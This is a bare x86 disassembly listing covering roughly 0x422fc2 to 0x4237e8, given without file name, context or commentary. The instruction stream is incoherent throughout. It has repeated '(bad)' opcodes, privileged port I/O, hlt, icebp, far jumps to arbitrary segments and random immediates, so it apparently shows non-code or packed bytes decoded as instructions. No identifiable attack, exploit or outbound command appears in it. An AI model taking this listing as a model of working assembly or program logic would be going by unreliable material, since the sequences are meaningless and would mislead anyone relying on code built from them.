  422fc2:	mov    ch,0x2b
  422fc4:	mov    edi,0x3845e140
  422fc9:	jns    0x422fa4
  422fcb:	jo     0x422fb6
  422fcd:	cmc    
  422fce:	cmc    
  422fcf:	push   DWORD PTR [ebx+0x7f]
  422fd2:	sbb    cl,BYTE PTR [edx-0x24a0cce7]
  422fd8:	jne    0x422fa5
  422fda:	int3   
  422fdb:	int3   
  422fdc:	test   DWORD PTR [eax],eax
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [eax],al
  422fe2:	lods   al,BYTE PTR ds:[esi]
  422fe3:	(bad)  
  422fe5:	xchg   DWORD PTR [eax],edi
  422fe7:	jg     0x422f72
  422fe9:	xor    al,0x74
  422feb:	pop    ebx
  422fec:	ss cmp eax,0x4d3b3908
  422ff2:	ins    DWORD PTR es:[edi],dx
  422ff3:	out    dx,eax
  422ff4:	add    DWORD PTR [eax+0x751e60ec],eax
  422ffa:	push   ds
  422ffb:	add    dh,BYTE PTR [eax+esi*2+0x74]
  422fff:	add    edx,DWORD PTR [edi+0x41c7f222]
  423005:	jecxz  0x42301b
  423007:	lock dec edx
  423009:	xor    DWORD PTR ds:0x3e51f077,0xb5164d17
  423013:	add    bh,BYTE PTR [esi]
  423015:	push   es
  423016:	pop    edx
  423017:	enter  0x495e,0x79
  42301b:	jnp    0x423005
  42301d:	mov    ?,WORD PTR [edi]
  42301f:	fucom  st(7)
  423021:	ss xor eax,0xd3ccae50
  423027:	stc    
  423028:	call   0x6720227d
  42302d:	call   0x6dd48573
  423032:	cmp    DWORD PTR [ecx-0x66],edx
  423035:	ss retf 0xa47e
  423039:	mov    edi,0x10e2523a
  42303e:	xor    eax,0x8a042918
  423043:	ret    0x8729
  423046:	add    BYTE PTR [eax],al
  423048:	add    BYTE PTR [eax],al
  42304a:	add    BYTE PTR [ecx-0x52bfa003],bh
  423050:	jp     0x42307e
  423052:	lock in al,dx
  423054:	inc    esi
  423055:	mov    ebp,0x19c63088
  42305a:	push   edi
  42305b:	inc    edx
  42305c:	icebp  
  42305d:	xor    al,0xc
  42305f:	cld    
  423060:	outs   dx,BYTE PTR ds:[esi]
  423061:	lods   eax,DWORD PTR ds:[esi]
  423062:	cli    
  423063:	mov    BYTE PTR [esi-0x788abc0c],ah
  423069:	test   eax,0xa9347670
  42306e:	in     al,dx
  42306f:	fild   DWORD PTR [ecx]
  423071:	jmp    0x13544b79
  423076:	in     al,dx
  423077:	sub    al,0x81
  423079:	add    BYTE PTR [edi+0x6f],dh
  42307c:	in     al,dx
  42307d:	jne    0x423014
  42307f:	sti    
  423080:	inc    ebp
  423081:	fcom   DWORD PTR [ecx-0x70]
  423084:	cwde   
  423085:	cli    
  423086:	pop    esi
  423087:	jmp    0xe26c6790
  42308c:	loop   0x423075
  42308e:	(bad)  
  423090:	inc    ebp
  423091:	lock imul edi,DWORD PTR [esi+0x1b],0x3e3ff275
  423099:	hlt    
  42309a:	ss mov ch,0xf2
  42309d:	cmp    DWORD PTR [edx+ebx*1-0x4a8d128c],ecx
  4230a4:	out    dx,al
  4230a5:	xchg   DWORD PTR [edx+ecx*1+0x79e17c7e],ebp
  4230ac:	jge    0x4230f1
  4230ae:	call   0x4230b3
  4230b3:	add    BYTE PTR [ebx-0x51],cl
  4230b6:	jne    0x4230a5
  4230b8:	dec    ebx
  4230b9:	ret    0xe4e7
  4230bc:	push   cs
  4230bd:	loop   0x42304c
  4230bf:	imul   esp
  4230c1:	jns    0x423105
  4230c3:	in     eax,0xab
  4230c5:	scas   eax,DWORD PTR es:[edi]
  4230c6:	jne    0x4230b8
  4230c8:	fnsave [eax+ebp*8]
  4230cb:	out    0xec,eax
  4230cd:	in     al,dx
  4230ce:	sti    
  4230cf:	ret    0xec16
  4230d2:	jne    0x4230a9
  4230d4:	xor    ebx,ebp
  4230d6:	jne    0x423091
  4230d8:	sub    edx,ebx
  4230da:	das    
  4230db:	outs   dx,DWORD PTR ds:[esi]
  4230dc:	mov    edi,0xad3cfbeb
  4230e1:	xchg   DWORD PTR [edx-0x1b],eax
  4230e4:	stc    
  4230e5:	cmp    eax,0xea12a6f4
  4230ea:	lea    esp,ds:0x81500169
  4230f0:	push   0x7c
  4230f2:	cli    
  4230f3:	mov    ?,eax
  4230f5:	inc    esp
  4230f6:	add    al,0x0
  4230f8:	rol    BYTE PTR [esi],cl
  4230fa:	daa    
  4230fb:	mov    edx,DWORD PTR [edx+0x2]
  4230fe:	mov    BYTE PTR [ebx+eiz*2],bl
  423101:	jle    0x423148
  423103:	hlt    
  423104:	pushf  
  423105:	jnp    0x423145
  423107:	or     BYTE PTR [edx],dh
  423109:	jle    0x423150
  42310b:	fdiv   QWORD PTR [edx]
  42310d:	jl     0x42314d
  42310f:	or     al,0xd7
  423111:	das    
  423112:	rol    BYTE PTR [ebx+0xe7405b4],1
  423118:	add    BYTE PTR [eax],al
  42311a:	add    BYTE PTR [eax],al
  42311c:	add    BYTE PTR [edi+ebx*2],al
  42311f:	add    eax,0xe2f8da88
  423124:	or     ah,BYTE PTR [edx+0x44]
  423127:	push   es
  423128:	add    dh,BYTE PTR [edi+0x2a46be02]
  42312e:	add    al,0xb0
  423130:	add    ebx,ebx
  423132:	dec    ebp
  423133:	leave  
  423134:	ret    0x320
  423137:	push   ebp
  423138:	mov    ecx,DWORD PTR [eax]
  42313a:	xchg   ah,ch
  42313c:	adc    dl,ah
  42313e:	push   ecx
  42313f:	div    DWORD PTR [ebp+0x4]
  423142:	mov    BYTE PTR [ebp-0x10],dh
  423145:	das    
  423146:	jmp    0x84f7:0xe9daeee8
  42314d:	or     al,0x5f
  42314f:	jns    0x4230dc
  423151:	xchg   ecx,eax
  423152:	repnz or DWORD PTR [ebp-0x5c],0xffffffc0
  423157:	add    al,0x1
  423159:	fdivr  QWORD PTR [ebp+0x45]
  42315c:	hlt    
  42315d:	inc    esi
  42315e:	sti    
  42315f:	aas    
  423160:	test   BYTE PTR ds:0xa748f960,al
  423166:	das    
  423167:	hlt    
  423168:	je     0x4230fb
  42316a:	cmp    BYTE PTR [eax],0x2f
  42316d:	sbb    edi,0x5eab3880
  423173:	cli    
  423174:	xor    dh,BYTE PTR [ebp-0x67]
  423177:	jp     0x423139
  423179:	add    eax,eax
  42317b:	jg     0x4231f5
  42317d:	je     0x423158
  42317f:	imul   edi,DWORD PTR [ecx],0x0
  423182:	add    BYTE PTR [eax],al
  423184:	add    BYTE PTR [eax],al
  423186:	and    eax,0x5dfbc75c
  42318b:	test   eax,0x616afa96
  423190:	out    dx,eax
  423191:	test   DWORD PTR [ebx-0x30],ebp
  423194:	sub    eax,0xfdb7568
  423199:	add    bh,bl
  42319b:	fld    TBYTE PTR [ebp+0x0]
  42319e:	mov    ds:0x66840a3c,eax
  4231a3:	fwait
  4231a4:	inc    DWORD PTR [ebp+esi*1-0x62adf049]
  4231ab:	inc    edx
  4231ac:	repnz add BYTE PTR [ebp+0x58],dh
  4231b0:	(bad)  
  4231b1:	sti    
  4231b2:	or     eax,0x1afa90bf
  4231b7:	jno    0x4231b0
  4231b9:	push   edx
  4231ba:	sbb    eax,0xafa82ba
  4231bf:	std    
  4231c0:	imul   esi,eax,0xfa82e20d
  4231c6:	cli    
  4231c7:	in     al,dx
  4231c8:	ins    DWORD PTR es:[edi],dx
  4231c9:	hlt    
  4231ca:	(bad)  
  4231cc:	cmp    dl,0xea
  4231cf:	pusha  
  4231d0:	rcr    BYTE PTR [ebx+0x43],0xb2
  4231d4:	mov    esi,0x87357504
  4231d9:	lock cmc 
  4231db:	adc    eax,0x25747538
  4231e0:	test   BYTE PTR [edx],bh
  4231e2:	xchg   edx,eax
  4231e3:	cs add eax,0x70ac2242
  4231e9:	and    al,0x0
  4231eb:	add    BYTE PTR [eax],al
  4231ed:	add    BYTE PTR [eax],al
  4231ef:	or     DWORD PTR ds:0xc8f515f3,0x2f8003f
  4231f9:	test   eax,0xe5787e71
  4231fe:	xor    eax,0x101dc2f9
  423203:	dec    ecx
  423204:	and    dl,BYTE PTR ds:0xf6fb4114
  42320a:	(bad)  
  42320b:	ds push edx
  42320e:	or     esi,DWORD PTR [ecx-0x510002d4]
  423214:	sbb    eax,0x312fff4
  423219:	dec    esi
  42321a:	add    cl,BYTE PTR [ebx+0x79c1bbc2]
  423220:	add    bh,BYTE PTR [edx+ecx*4+0x143d8159]
  423227:	xchg   edx,eax
  423228:	mov    ebx,0x7b3e329a
  42322d:	lods   al,BYTE PTR ds:[esi]
  42322e:	out    dx,eax
  42322f:	std    
  423230:	xor    ecx,DWORD PTR ds:[ebp+0x4960f2a8]
  423237:	sbb    eax,0x6e0bb42b
  42323c:	test   bl,dl
  42323e:	add    al,0x75
  423240:	add    bh,BYTE PTR [ebx+0x20300bea]
  423246:	cmp    eax,0x57df6b0
  42324b:	cmc    
  42324c:	sub    eax,0xfa6835da
  423251:	icebp  
  423252:	dec    eax
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [eax],al
  423257:	add    cl,ah
  423259:	fcmovu st,st(4)
  42325b:	add    al,0x75
  42325d:	add    dh,BYTE PTR [edi+ebp*1+0x7e]
  423261:	js     0x423246
  423263:	aaa    
  423264:	xchg   ecx,eax
  423265:	std    
  423266:	imul   ebp,DWORD PTR [eax-0x7516fd8b],0x38
  42326d:	test   dl,0x40
  423270:	rol    DWORD PTR [esi-0x1007f957],0x0
  423277:	jmp    0x34c934f2
  42327c:	jno    0x4232a3
  42327e:	repz imul ebx,DWORD PTR ds:0x526c00e8,0x401d0109
  423289:	ins    DWORD PTR es:[edi],dx
  42328a:	cli    
  42328b:	out    0x7b,al
  42328d:	adc    dh,0xe9
  423290:	jbe    0x423294
  423292:	add    cl,0x9b
  423295:	test   DWORD PTR [eax+ebx*4+0x1000276],0xe94074cd
  4232a0:	int3   
  4232a1:	add    BYTE PTR [eax-0x42],al
  4232a4:	pop    esi
  4232a5:	xor    eax,0x874356fb
  4232aa:	rcr    dh,0xc2
  4232ad:	mov    bl,0x0
  4232af:	jmp    0x3f87f32a
  4232b4:	jbe    0x42328f
  4232b6:	scas   al,BYTE PTR es:[edi]
  4232b7:	jmp    0xe7a83532
  4232bc:	add    BYTE PTR [eax],al
  4232be:	add    BYTE PTR [eax],al
  4232c0:	add    bl,cl
  4232c2:	xor    esi,ebx
  4232c4:	lahf   
  4232c5:	imul   ebx,DWORD PTR [edx+0x6c],0xffffffa3
  4232c9:	mov    dh,0x2
  4232cb:	call   0xfc2a36c1
  4232d0:	gs ss ja 0x4232dd
  4232d4:	das    
  4232d5:	mov    ch,0xe8
  4232d7:	add    DWORD PTR [eax],edx
  4232d9:	add    al,BYTE PTR [ebx]
  4232db:	add    cl,ch
  4232dd:	sub    BYTE PTR [esi-0x5],al
  4232e0:	jmp    0xe687e360
  4232e5:	jo     0x423297
  4232e7:	mov    eax,0x424f35
  4232ec:	adc    bl,al
  4232ee:	jo     0x423303
  4232f0:	into   
  4232f1:	test   DWORD PTR [ebp+0x420b0098],eax
  4232f7:	add    BYTE PTR [ebx+0x448df659],cl
  4232fd:	les    eax,FWORD PTR [eax]
  4232ff:	call   0xf83805e9
  423304:	test   ah,cl
  423306:	pop    ebx
  423307:	add    edi,esi
  423309:	pop    ecx
  42330a:	cmc    
  42330b:	cmp    BYTE PTR [ebp-0x1d],0xfa
  42330f:	imul   edx,ecx,0xb60755f7
  423315:	dec    ecx
  423316:	cmc    
  423317:	add    BYTE PTR [eax+0x40687c],0xf7
  42331e:	aaa    
  42331f:	cmp    DWORD PTR [ebp-0x18],ecx
  423322:	pop    ebx
  423323:	inc    esi
  423324:	add    BYTE PTR [eax],0x0
  423327:	add    BYTE PTR [eax],al
  423329:	add    BYTE PTR [ecx-0xb],dl
  42332c:	add    BYTE PTR [ebp+0x4],dh
  42332f:	xor    ecx,DWORD PTR ds:0x2331874
  423335:	je     0x423343
  423337:	xor    ecx,DWORD PTR [ecx]
  423339:	je     0x4233ab
  42333b:	sub    bl,BYTE PTR [esi]
  42333d:	jne    0x4232c0
  42333f:	jns    0x423386
  423341:	or     BYTE PTR [edi-0x53],dh
  423344:	jnp    0x42333e
  423346:	sbb    DWORD PTR [ebp+0x1b],ebx
  423349:	push   0x9
  42334b:	push   edi
  42334c:	je     0x4233c8
  42334e:	fdiv   st(6),st
  423350:	mov    WORD PTR [ebx+eax*1+0x0],es
  423354:	push   eax
  423355:	dec    DWORD PTR [ecx]
  423357:	jg     0x423364
  423359:	inc    eax
  42335a:	or     al,0x6c
  42335c:	shl    BYTE PTR [ebp-0x1f],0x79
  423360:	inc    ebp
  423361:	clc    
  423362:	pop    edi
  423363:	sub    esi,eax
  423365:	add    eax,0x2018029a
  42336a:	(bad)  
  42336b:	test   BYTE PTR [ecx-0x7bbb8fa],0x88
  423372:	jne    0x423351
  423374:	push   ss
  423375:	sti    
  423376:	cmp    cl,dl
  423378:	mov    BYTE PTR [ebp-0x3b],bh
  42337b:	sbb    eax,DWORD PTR [edi+0x72ffa57d]
  423381:	or     BYTE PTR [edx+0x57],bh
  423384:	(bad)  
  423387:	fwait
  423388:	push   ebp
  423389:	xchg   DWORD PTR [eax],esi
  42338b:	mov    eax,ds:0xc328
  423390:	add    BYTE PTR [eax],al
  423392:	add    BYTE PTR [esi+0x26],dh
  423395:	or     al,0x5b
  423397:	mov    esp,0x28fffb96
  42339c:	pusha  
  42339d:	out    dx,eax
  42339e:	push   ebx
  42339f:	inc    esi
  4233a0:	cdq    
  4233a1:	xor    bl,bh
  4233a3:	lods   al,BYTE PTR ds:[esi]
  4233a4:	pop    ds
  4233a5:	and    BYTE PTR [eax],dl
  4233a7:	jp     0x423402
  4233a9:	jl     0x4233ab
  4233ab:	jne    0x423388
  4233ad:	push   eax
  4233ae:	xchg   DWORD PTR [ecx-0x7e79ec09],ebp
  4233b4:	fdivr  DWORD PTR [edi-0x7]
  4233b7:	xchg   ebp,eax
  4233b8:	(bad)  
  4233b9:	std    
  4233ba:	sar    DWORD PTR [ecx+0xb],0x29
  4233be:	out    0xd2,eax
  4233c0:	pop    ebx
  4233c1:	div    BYTE PTR [eax]
  4233c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233c4:	cmc    
  4233c5:	jg     0x4233c0
  4233c7:	pop    eax
  4233c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233c9:	cli    
  4233ca:	jg     0x4233e8
  4233cc:	jmp    0x6f3e:0x22f51c6a
  4233d3:	js     0x423430
  4233d5:	idiv   BYTE PTR [ecx]
  4233d7:	sub    ch,0x82
  4233da:	push   ecx
  4233db:	fcomp  DWORD PTR [ebx-0x7]
  4233de:	add    eax,0xf97fd682
  4233e3:	push   edx
  4233e4:	outs   dx,BYTE PTR ds:[esi]
  4233e5:	cli    
  4233e6:	jg     0x4233d4
  4233e8:	jne    0x423457
  4233ea:	cmp    edi,ebp
  4233ec:	or     bh,BYTE PTR [edi+0x690271e6]
  4233f2:	in     eax,0x7e
  4233f4:	sbb    bh,0xfd
  4233f7:	add    BYTE PTR [eax],al
  4233f9:	add    BYTE PTR [eax],al
  4233fb:	add    BYTE PTR [edi-0x78],bh
  4233fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ff:	repnz mov edx,0xf50bc682
  423405:	(bad)  
  423408:	retf   
  423409:	add    al,0xfd
  42340c:	jg     0x423396
  42340e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42340f:	repnz mov ebx,0xf50bc782
  423415:	(bad)  
  423416:	fxch   st(1)
  423418:	jns    0x42344c
  42341a:	les    eax,FWORD PTR ds:0x34357aa4
  423420:	je     0x42349c
  423422:	xor    eax,0xa9847b34
  423427:	push   es
  423428:	pop    edx
  423429:	add    eax,0x41a50071
  42342e:	sub    DWORD PTR [edi],ebp
  423430:	loope  0x423450
  423432:	aad    0x2
  423434:	fld    TBYTE PTR [ebp+0x62]
  423437:	repz dec esi
  423439:	dec    ebp
  42343a:	mov    edx,0xe90071c9
  42343f:	push   ecx
  423440:	add    edi,edx
  423442:	call   0xf160e5c5
  423447:	pop    esi
  423448:	xor    eax,0xa159a905
  42344d:	push   es
  42344e:	inc    ecx
  42344f:	jb     0x42344c
  423451:	out    0x2a,eax
  423453:	jg     0x42347a
  423455:	jg     0x423472
  423457:	js     0x4234bd
  423459:	jmp    0xe9bb5bf3
  42345e:	popf   
  42345f:	daa    
  423460:	add    BYTE PTR [eax],al
  423462:	add    BYTE PTR [eax],al
  423464:	add    BYTE PTR [ecx-0x26],dh
  423467:	into   
  423468:	repnz (bad) 
  42346a:	call   0x41cfedd
  42346f:	mov    dh,0xc3
  423471:	dec    edi
  423472:	les    eax,FWORD PTR [eax]
  423474:	loope  0x4234ec
  423476:	dec    edi
  423477:	xchg   ebp,edi
  423479:	repz aad 0xc
  42347c:	push   0x45
  42347e:	adc    al,BYTE PTR [edi+edx*2]
  423481:	ja     0x423470
  423483:	jne    0x42347e
  423485:	(bad)  
  423486:	push   cs
  423487:	in     al,dx
  423488:	sti    
  423489:	add    cl,BYTE PTR ss:[ecx+0x4e0a52c]
  423490:	push   0x1d
  423492:	out    0x0,al
  423494:	bound  ebp,QWORD PTR ds:0x751c86fa
  42349a:	cmp    DWORD PTR [edx+0x74],edx
  42349d:	dec    edx
  42349e:	cli    
  42349f:	xchg   BYTE PTR [ebp*2+0x3e92169],ch
  4234a6:	retf   0x6053
  4234a9:	and    eax,0xebaf37ea
  4234ae:	xor    eax,0xeae56c4f
  4234b3:	call   0xfc2f3cb1
  4234b8:	bound  ecx,QWORD PTR [esi+0x18]
  4234bb:	into   
  4234bc:	and    ah,BYTE PTR [ebx+0x6f]
  4234bf:	inc    ebp
  4234c0:	and    ah,BYTE PTR [edx+edi*8+0x4d91f874]
  4234c7:	adc    ch,dl
  4234c9:	add    BYTE PTR [eax],al
  4234cb:	add    BYTE PTR [eax],al
  4234cd:	add    BYTE PTR [ebp+0x79d97d67],dh
  4234d3:	outs   dx,BYTE PTR ds:[esi]
  4234d4:	inc    ebx
  4234d5:	push   0xffffffa5
  4234d7:	adc    bh,dh
  4234d9:	mov    esp,0x2d7d2fb9
  4234de:	pushf  
  4234df:	adc    bl,bh
  4234e1:	pushf  
  4234e2:	and    bh,BYTE PTR [eax]
  4234e4:	sti    
  4234e5:	xchg   esp,eax
  4234e6:	data16 jmp 0x4234fe
  4234e9:	imul   ebp,DWORD PTR [ebx+0x42],0x6e366400
  4234f0:	or     DWORD PTR [eax],eax
  4234f2:	addr16 cmp bh,ah
  4234f5:	sub    BYTE PTR [eax],0x1
  4234f8:	xor    dh,BYTE PTR [ecx+ebp*2+0x68]
  4234fc:	pop    ebp
  4234fd:	clc    
  4234fe:	daa    
  4234ff:	shr    BYTE PTR [edx-0x4d],cl
  423502:	outs   dx,DWORD PTR ds:[esi]
  423503:	mov    esi,0xab375e57
  423508:	mov    edx,0x7d7ecc10
  42350d:	adc    bh,cl
  42350f:	jo     0x423502
  423511:	mov    esp,DWORD PTR [ecx-0x2a]
  423514:	or     DWORD PTR [ebp-0x40],0x6
  423518:	lock mov DWORD PTR [ebp-0x6f72203a],ebx
  42351f:	adc    al,BYTE PTR [ebx+0x6bbb97f3]
  423525:	fadd   QWORD PTR [esi]
  423527:	add    al,0x80
  423529:	stc    
  42352a:	lods   al,BYTE PTR ds:[esi]
  42352b:	outs   dx,DWORD PTR ds:[esi]
  42352c:	add    al,BYTE PTR [eax+0xf77ebe5]
  423532:	add    BYTE PTR [eax],al
  423534:	add    BYTE PTR [eax],al
  423536:	add    ah,bl
  423538:	fisttp DWORD PTR ds:0xf27e667f
  42353e:	add    bl,BYTE PTR [edi-0x1]
  423541:	mov    BYTE PTR [ecx+eax*8-0x16],dh
  423545:	cmp    al,BYTE PTR [esi-0x69]
  423548:	out    dx,al
  423549:	push   0xffffffe0
  42354b:	(bad)  
  42354d:	cli    
  42354e:	jno    0x423533
  423550:	jl     0x4235cf
  423552:	adc    BYTE PTR [edi+ebp*2+0x13],cl
  423556:	cmp    DWORD PTR [ecx],0x13
  423559:	add    DWORD PTR [eax+ebx*1+0x7e],esi
  42355d:	jge    0x42356f
  42355f:	push   cs
  423560:	jo     0x42356c
  423562:	mov    ebp,ecx
  423564:	fidivr DWORD PTR [ebx]
  423566:	jmp    0x423570
  423568:	pop    bp
  42356a:	hlt    
  42356b:	xchg   DWORD PTR [edi],edi
  42356d:	clc    
  42356e:	inc    ebx
  42356f:	jne    0x423575
  423571:	add    eax,0x7d0db087
  423576:	dec    ebp
  423577:	mov    esp,edx
  423579:	les    ecx,FWORD PTR [ecx-0x72eeeb8c]
  42357f:	jno    0x423551
  423581:	jp     0x4235df
  423583:	jbe    0x42355f
  423585:	jge    0x423586
  423587:	mov    ?,ecx
  423589:	ja     0x423593
  42358b:	mov    edx,esi
  42358d:	imul   eax,DWORD PTR [ebx],0xffffff81
  423590:	fidiv  WORD PTR [eax-0x1]
  423593:	aaa    
  423594:	(bad)  
  423595:	loopne 0x42351e
  423597:	cmp    ch,al
  423599:	sbb    al,0xc7
  42359b:	add    BYTE PTR [eax],al
  42359d:	add    BYTE PTR [eax],al
  42359f:	add    ah,bh
  4235a1:	lock jl 0x423563
  4235a4:	mov    WORD PTR [esi],?
  4235a6:	icebp  
  4235a7:	sti    
  4235a8:	call   0x562a:0x24ec7d0d
  4235af:	push   ebx
  4235b0:	mov    cl,BYTE PTR ds:0x7d68fb14
  4235b6:	adc    eax,0x72647540
  4235bb:	or     ah,bh
  4235bd:	push   ss
  4235be:	in     al,dx
  4235bf:	xchg   DWORD PTR [eax+0x7b3c7ad7],esi
  4235c5:	mov    al,0xf8
  4235c7:	outs   dx,DWORD PTR ds:[esi]
  4235c8:	fisttp QWORD PTR [eax]
  4235ca:	jge    0x42358f
  4235cc:	sahf   
  4235cd:	adc    eax,0xad7f664f
  4235d2:	lock adc eax,0x3fe5cd
  4235d8:	neg    BYTE PTR [edi]
  4235da:	sti    
  4235db:	mov    BYTE PTR [eax-0x5f3f7dc1],bh
  4235e1:	fidiv  WORD PTR [esi+0x7d]
  4235e4:	and    DWORD PTR [ecx+0x4],eax
  4235e7:	sti    
  4235e8:	mov    al,0x17
  4235ea:	jl     0x423649
  4235ec:	adc    DWORD PTR [ebx],eax
  4235ee:	into   
  4235ef:	ror    DWORD PTR [edx-0x4e881717],1
  4235f5:	or     DWORD PTR [esi],0x68ff8005
  4235fb:	xor    DWORD PTR [eax+0x307ca76e],eax
  423601:	jmp    0x0:0x3b6c
  423608:	add    BYTE PTR [ecx+ebp*1+0x10],dh
  42360c:	jns    0x4235b2
  42360e:	sub    BYTE PTR [ebp+0xe6f8b09],0x54
  423615:	daa    
  423616:	in     eax,0x54
  423618:	adc    al,0xbe
  42361a:	punpckhwd mm2,QWORD PTR [ebx]
  42361d:	xor    eax,0x28c46402
  423622:	push   es
  423623:	push   cs
  423624:	jno    0x4235cf
  423626:	dec    ebp
  423627:	mov    edx,0xb24ca179
  42362c:	sbb    DWORD PTR [ecx+0xc],ebx
  42362f:	sub    DWORD PTR [esp+ebx*2],eax
  423632:	inc    edi
  423633:	cmc    
  423634:	jp     0x42363e
  423636:	cli    
  423637:	gs enter 0x171,0x14
  42363c:	add    BYTE PTR [edx+0x71795e01],dl
  423642:	sub    DWORD PTR [edx+0x72],edi
  423645:	repz dec eax
  423647:	outs   dx,BYTE PTR ds:[esi]
  423648:	dec    ecx
  423649:	jno    0x423690
  42364b:	adc    edi,DWORD PTR [ebp+0x58e8f61b]
  423651:	cli    
  423652:	aad    0x66
  423654:	loopne 0x4236bb
  423656:	push   ecx
  423657:	mov    bl,0xee
  423659:	enter  0x5e0e,0x39
  42365d:	dec    ecx
  42365e:	adc    BYTE PTR [ecx+0x42cc2e03],ch
  423664:	jns    0x4235eb
  423666:	jnp    0x42360c
  423668:	out    dx,eax
  423669:	push   ds
  42366a:	int3   
  42366b:	add    BYTE PTR [edx+0x0],ah
  42366e:	add    BYTE PTR [eax],al
  423670:	add    BYTE PTR [eax],al
  423672:	mov    ah,0xf6
  423674:	mov    BYTE PTR [esi+eax*1-0xa0eba83],ah
  42367b:	sub    eax,0x7b317208
  423680:	pop    ebp
  423681:	sbb    eax,0x6a0bc04e
  423686:	push   ss
  423687:	add    al,BYTE PTR [eax]
  423689:	jmp    0x7ccf6bd1
  42368e:	jmp    0x89e8:0xcb54b1d9
  423695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423696:	fidivr WORD PTR [esi-0x40]
  423699:	div    dl
  42369b:	jbe    0x42369d
  42369d:	jmp    0xd9bfb418
  4236a2:	pop    ecx
  4236a4:	jb     0x4236f8
  4236a6:	dec    edx
  4236a7:	xor    eax,0xe9813cfb
  4236ac:	adc    eax,0x428769
  4236b1:	ins    BYTE PTR es:[edi],dx
  4236b2:	mov    dh,0x6e
  4236b4:	ins    BYTE PTR es:[edi],dx
  4236b5:	imul   esp,DWORD PTR [edx+0x2d],0x7d131c36
  4236bc:	dec    ebp
  4236bd:	mov    eax,ds:0xc243bd77
  4236c2:	sub    DWORD PTR [ebp+0x27],0x87e6cd62
  4236c9:	scas   al,BYTE PTR es:[edi]
  4236ca:	std    
  4236cb:	mov    ah,0x74
  4236cd:	in     eax,0xf5
  4236cf:	ds adc ebp,eax
  4236d2:	(bad)  
  4236d3:	cmp    eax,0xf7f8
  4236d8:	add    BYTE PTR [eax],al
  4236da:	add    BYTE PTR [ebp+0x51],dh
  4236dd:	(bad)  
  4236de:	std    
  4236df:	jle    0x42375c
  4236e1:	retf   0xee51
  4236e4:	jp     0x4236e0
  4236e6:	push   esi
  4236e7:	pop    ds
  4236e8:	imul   DWORD PTR [esi-0x1d]
  4236eb:	enter  0xff51,0xff
  4236ef:	pop    edi
  4236f0:	dec    edi
  4236f1:	call   0xf817db69
  4236f6:	and    ecx,0xffffffd3
  4236f9:	add    BYTE PTR [esi+0x2b],dh
  4236fc:	aad    0x75
  4236fe:	cld    
  4236ff:	pop    edx
  423700:	sti    
  423701:	push   ss
  423702:	and    BYTE PTR [ebx+0x6a],ah
  423705:	adc    al,0x47
  423707:	xchg   ecx,eax
  423708:	sti    
  423709:	push   ss
  42370a:	push   eax
  42370b:	je     0x423743
  42370d:	mov    dh,bh
  42370f:	jae    0x423711
  423711:	jge    0x42370f
  423713:	cmp    cl,BYTE PTR [bx+si]
  423716:	sub    ebx,esp
  423718:	add    edi,ebp
  42371a:	sub    esp,DWORD PTR [ecx-0x29]
  42371d:	sti    
  42371e:	repnz inc ebp
  423720:	imul   ecx,DWORD PTR [ebx+eax*1],0xffffff9c
  423724:	(bad)  
  423725:	jl     0x42371b
  423727:	push   edi
  423728:	xor    esi,esp
  42372a:	cmp    esp,edx
  42372c:	in     eax,0x7d
  42372e:	pop    edi
  42372f:	mov    bl,0xd5
  423731:	neg    DWORD PTR [edi+0x27]
  423734:	cmp    ecx,DWORD PTR [esi+ebx*2]
  423737:	xchg   DWORD PTR [edi+0x4c9c10ba],esp
  42373d:	sub    esp,0x0
  423740:	add    BYTE PTR [eax],al
  423742:	add    BYTE PTR [eax],al
  423744:	dec    ebp
  423745:	push   ecx
  423746:	dec    esi
  423747:	mov    ebp,DWORD PTR [ecx-0x73bff53d]
  42374d:	dec    esi
  42374e:	div    DWORD PTR [ebp+0x50]
  423751:	(bad)  
  423752:	into   
  423753:	jmp    FWORD PTR [ecx-0x19]
  423756:	cmp    al,0xe3
  423759:	int3   
  42375a:	test   edi,edi
  42375c:	bound  esi,QWORD PTR ds:0x3962c085
  423762:	add    DWORD PTR [ebp+0x44],0xffffffb1
  423766:	aaa    
  423767:	call   0x38b01c
  42376c:	jne    0x4237c4
  42376e:	les    esi,FWORD PTR [ecx+eax*8-0x67]
  423772:	dec    edi
  423773:	mov    DWORD PTR [eax-0x132d130f],esi
  423779:	popf   
  42377a:	jmp    0x423709
  42377c:	mov    cl,0xf1
  42377e:	add    DWORD PTR [ebp-0x17d652cb],eax
  423784:	lea    edx,[edx+ebp*8-0x5]
  423788:	out    dx,al
  423789:	inc    eax
  42378a:	adc    edi,0xffffff81
  42378d:	mov    esp,0xac814578
  423792:	dec    edi
  423793:	dec    edi
  423794:	fld    QWORD PTR [edx]
  423796:	test   edx,edi
  423798:	loop   0x4237c0
  42379a:	sub    eax,0xd7b0a18d
  42379f:	mov    dl,0xef
  4237a1:	shr    ah,cl
  4237a3:	sti    
  4237a4:	inc    eax
  4237a5:	icebp  
  4237a6:	hlt    
  4237a7:	fadd   DWORD PTR [eax]
  4237a9:	add    BYTE PTR [eax],al
  4237ab:	add    BYTE PTR [eax],al
  4237ad:	pop    edi
  4237ae:	cdq    
  4237af:	and    esp,ebx
  4237b1:	ja     0x42374a
  4237b3:	ja     0x4237b7
  4237b5:	(bad)  
  4237b6:	sbb    eax,0xbd9d42f0
  4237bb:	xchg   ecx,eax
  4237bc:	cli    
  4237bd:	mov    ds:0x6fe7c06f,al
  4237c2:	lods   al,BYTE PTR ds:[esi]
  4237c3:	jb     0x4237d1
  4237c5:	(bad)  
  4237c6:	fwait
  4237c7:	xlat   BYTE PTR ds:[ebx]
  4237c8:	dec    ebp
  4237c9:	out    0x9a,al
  4237cb:	in     al,dx
  4237cc:	pop    ebx
  4237cd:	and    eax,DWORD PTR [eax-0x49]
  4237d0:	mov    esi,0x8752d96d
  4237d5:	popa   
  4237d6:	imul   ebx,ebx,0x10
  4237d9:	je     0x4237c6
  4237db:	dec    DWORD PTR [esi-0x35]
  4237de:	clc    
  4237df:	push   ebp
  4237e0:	add    ch,dh
  4237e2:	pop    ebx
  4237e3:	inc    edi
  4237e4:	ret    0x54b8
  4237e7:	(bad)  
  4237e8:	cmp    BYTE PTR [eax-0xb030efe],dh
